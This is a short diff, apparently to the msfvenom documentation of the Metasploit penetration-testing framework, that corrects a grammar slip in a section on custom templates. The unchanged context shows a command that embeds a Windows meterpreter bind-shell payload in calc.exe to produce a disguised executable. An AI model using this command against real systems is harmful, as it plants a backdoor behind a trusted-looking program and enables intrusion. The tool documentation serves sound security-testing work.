@@ -70,7 +70,7 @@ The -b flag is meant to be used to avoid certain characters in the payload. When
 
 **How to supply a custom template**
 
-By default, msfvenom uses templates from the msf/data/templates directory. If you like to choose your own, you can use the -x flag like the following:
+By default, msfvenom uses templates from the msf/data/templates directory. If you'd like to choose your own, you can use the -x flag like the following:
 
 ```
 ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
